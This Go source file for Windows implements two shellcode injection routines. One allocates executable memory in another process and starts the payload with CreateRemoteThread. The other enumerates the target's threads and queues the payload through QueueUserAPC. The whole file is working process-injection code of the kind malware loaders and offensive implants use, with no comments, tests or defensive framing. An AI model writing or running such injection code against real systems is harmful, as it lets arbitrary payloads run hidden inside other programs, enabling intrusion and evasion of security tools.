//go:build windows
// +build windows

package main

import (
	"fmt"
	"unsafe"
)

func doCreateRemoteThread(hProc uintptr, sc []byte) error {
	addr, err := allocateRX(hProc, sc)
	if err != nil {
		return err
	}
	thread, _, _ := procCreateRemoteThread.Call(
		hProc, 0, 0, addr, 0, 0, 0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}
	procCloseHandle.Call(thread)
	return nil
}

func doQueueUserAPC(hProc uintptr, pid uint32, sc []byte) error {
	addr, err := allocateRX(hProc, sc)
	if err != nil {
		return err
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("thread snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			hThread, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME|0x0010, 0, uintptr(te.th32ThreadID))
			if hThread != 0 {
				queued, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
				procCloseHandle.Call(hThread)
				if queued == 0 {
					return fmt.Errorf("QueueUserAPC failed")
				}
				return nil
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Errorf("no suitable thread for APC")
}
